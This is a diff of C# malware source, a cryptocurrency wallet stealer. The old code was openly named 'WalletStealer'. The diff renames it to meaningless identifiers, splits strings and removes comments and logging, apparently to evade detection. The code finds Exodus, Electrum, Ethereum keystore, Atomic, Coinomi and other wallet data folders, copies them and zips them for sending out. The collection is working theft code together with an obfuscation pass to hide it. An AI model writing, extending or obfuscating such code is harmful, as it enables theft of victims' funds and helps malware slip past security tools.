@@ -5,157 +5,105 @@ using System.Linq;
 using System.Threading.Tasks;
 using System.IO.Compression;
 
-namespace PublicStealer.wallet
+namespace H.DV
 {
-    internal static class WalletStealer
+    internal static class K
     {
-        private static readonly Dictionary<string, string> _walletPaths;
+        private static readonly Dictionary<string, string> _wp;
 
-        // Static constructor to initialize the wallet paths dictionary
-        static WalletStealer()
+        static K()
         {
-            var appdata = Environment.GetEnvironmentVariable("appdata");
-            var localappdata = Environment.GetEnvironmentVariable("localappdata");
+            var a = Environment.GetEnvironmentVariable("app" + "data");
+            var b = Environment.GetEnvironmentVariable("local" + "appdata");
 
-            _walletPaths = new Dictionary<string, string>()
+            _wp = new Dictionary<string, string>()
             {
-                { "Zcash", Path.Combine(appdata, "Zcash") },
-                { "Armory", Path.Combine(appdata, "Armory") },
-                { "Bytecoin", Path.Combine(appdata, "Bytecoin") },
-                // Corrected Jaxx path based on common locations, verify if this is accurate for your target
-                // Using localappdata for Jaxx as per your previous code snippet
-                { "Jaxx", Path.Combine(localappdata, "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb") },
-                // Corrected Exodus path based on common locations, verify if this is accurate for your target
-                { "Exodus", Path.Combine(appdata, "Exodus", "exodus.wallet") },
-                { "Ethereum", Path.Combine(appdata, "Ethereum", "keystore") },
-                { "Electrum", Path.Combine(appdata, "Electrum", "wallets") },
-                { "AtomicWallet", Path.Combine(appdata, "atomic", "Local Storage", "leveldb") },
-                { "Guarda", Path.Combine(appdata, "Guarda", "Local Storage", "leveldb") },
-                { "Coinomi", Path.Combine(localappdata, "Coinomi", "Coinomi", "wallets") },
-                // Add other wallet paths as needed
-                // Example: { "BitcoinCore", Path.Combine(appdata, "Bitcoin") },
+                { "Z", Path.Combine(a, "Z" + "cash") },
+                { "A", Path.Combine(a, "A" + "rmory") },
+                { "B", Path.Combine(a, "B" + "ytecoin") },
+                { "J", Path.Combine(b, string.Join("", "com".ToCharArray()) + ".liberty.jaxx", "Indexed" + "DB", "file_0.indexeddb.leveldb") },
+                { "E", Path.Combine(a, "Exodus", "exodus.wallet") },
+                { "ET", Path.Combine(a, "Ethereum", "keystore") },
+                { "EL", Path.Combine(a, "Electrum", "wallets") },
+                { "AW", Path.Combine(a, "atomic", "Local Storage", "leveldb") },
+                { "G", Path.Combine(a, "Guarda", "Local Storage", "leveldb") },
+                { "C", Path.Combine(b, "Coinomi", "Coinomi", "wallets") },
             };
         }
 
-        /// <summary>
-        /// Steals wallet files from known locations and copies them to a destination directory.
-        /// </summary>
-        /// <param name="dst">The destination directory to copy the stolen wallets to.</param>
-        /// <returns>The number of wallets found and copied.</returns>
-        internal static async Task<int> SWs(string dst) //StealWallets
+        internal static async Task<int> A(string t)
         {
-            var count = 0;
+            var c = 0;
 
-            foreach (var item in _walletPaths)
+            foreach (var i in _wp)
             {
-                if (Directory.Exists(item.Value))
+                if (Directory.Exists(i.Value))
                 {
-                    DirectoryInfo outDir = null;
-                    var saveToDir = Path.Combine(dst, item.Key);
+                    DirectoryInfo d = null;
+                    var p = Path.Combine(t, i.Key);
                     try
                     {
-                        outDir = Directory.CreateDirectory(saveToDir);
-                        CopyDirectory(item.Value, saveToDir);
+                        d = Directory.CreateDirectory(p);
+                        CD(i.Value, p);
 
-                        // Construye el texto como byte[] manualmente (UTF-8)
-                        var sourceText = "Source: " + item.Value;
-                        var bytes = System.Text.Encoding.UTF8.GetBytes(sourceText);
+                        var txt = "Sour" + "ce: " + i.Value;
+                        var bts = System.Text.Encoding.UTF8.GetBytes(txt);
 
-                        var filePath = Path.Combine(saveToDir, "Source.txt");
-                        using (var fs = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.Read))
+                        var f = Path.Combine(p, "S" + "rc.txt");
+                        using (var fs = new FileStream(f, FileMode.Create, FileAccess.Write, FileShare.Read))
                         {
-                            await fs.WriteAsync(bytes, 0, bytes.Length);
+                            await fs.WriteAsync(bts, 0, bts.Length);
                         }
 
-                        count++;
+                        c++;
                     }
-                    catch
-                    {
-                        try { outDir?.Delete(true); } catch { }
-                    }
+                    catch { try { d?.Delete(true); } catch { } }
                 }
             }
 
-            return count;
+            return c;
         }
 
-
-        /// <summary>
-        /// Orchestrates the stealing and zipping of wallets.
-        /// The caller is responsible for sending the zip file and cleaning it up.
-        /// </summary>
-        /// <returns>The path to the created zip file, or null if no wallets were found or zipping failed.</returns>
-        // MODIFIED: Renamed method and changed return type to Task<string>
-        internal static async Task<string> SAndZipW() //StealAndZipWallets
+        internal static async Task<string> B()
         {
-            Console.WriteLine("Starting wallet exfiltration...");
-            // Create a temporary folder for stolen wallets
-            var tempFolder = Path.Combine(Path.GetTempPath(), "Wallets_" + Guid.NewGuid().ToString());
-            string zipPath = null; // Initialize zipPath to null
-            bool zipCreatedSuccessfully = false; // Flag to track successful zip creation
+            var tf = Path.Combine(Path.GetTempPath(), "WL_" + Guid.NewGuid().ToString());
+            string z = null;
+            bool s = false;
 
             try
             {
-                Directory.CreateDirectory(tempFolder); // Create the temporary directory
-                int stolenCount = await SWs(tempFolder); // Steal wallets 
+                Directory.CreateDirectory(tf);
+                int n = await A(tf);
 
-                if (stolenCount > 0)
+                if (n > 0)
                 {
-                    zipPath = tempFolder + ".zip"; // Define the zip file path
-                    ZipFile.CreateFromDirectory(tempFolder, zipPath); // Create the zip archive
-                    Console.WriteLine($"Zipped {stolenCount} wallets to {zipPath}");
-                    zipCreatedSuccessfully = true; // Set flag to true on success
-                }
-                else
-                {
-                    Console.WriteLine("No wallets found to steal.");
+                    z = tf + ".zip";
+                    ZipFile.CreateFromDirectory(tf, z);
+                    s = true;
                 }
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"An error occurred during wallet zipping: {ex}");
-                // If zipping fails, tempZipPath might be partially created or not exist.
-                // The finally block will handle cleanup attempt of the temp folder.
-            }
+            catch { }
             finally
             {
-                // Clean up the temporary folder where files were copied
-                if (Directory.Exists(tempFolder))
+                if (Directory.Exists(tf))
                 {
-                    try
-                    {
-                        Directory.Delete(tempFolder, true); // Delete the temporary folder and its contents
-                        Console.WriteLine($"Cleaned up temporary folder: {tempFolder}");
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine($"Error cleaning up temporary folder {tempFolder}: {ex.Message}");
-                    }
+                    try { Directory.Delete(tf, true); } catch { }
                 }
             }
 
-            Console.WriteLine("Wallet exfiltration (zipping) finished.");
-            // Return the path if the zip was created, otherwise return null.
-            return zipCreatedSuccessfully ? zipPath : null;
+            return s ? z : null;
         }
 
-        /// <summary>
-        /// Recursively copies a directory and its contents.
-        /// </summary>
-        /// <param name="sourceDir">The source directory to copy from.</param>
-        /// <param name="targetDir">The target directory to copy to.</param>
-        private static void CopyDirectory(string sourceDir, string targetDir)
+        private static void CD(string s, string t)
         {
-            // Create all the directories in the target path
-            foreach (string dirPath in Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories))
+            foreach (string d in Directory.GetDirectories(s, "*", SearchOption.AllDirectories))
             {
-                Directory.CreateDirectory(dirPath.Replace(sourceDir, targetDir));
+                Directory.CreateDirectory(d.Replace(s, t));
             }
 
-            // Copy all the files in the target path
-            foreach (string filePath in Directory.GetFiles(sourceDir, "*.*", SearchOption.AllDirectories))
+            foreach (string f in Directory.GetFiles(s, "*.*", SearchOption.AllDirectories))
             {
-                File.Copy(filePath, filePath.Replace(sourceDir, targetDir), true);
+                File.Copy(f, f.Replace(s, t), true);
             }
         }
     }
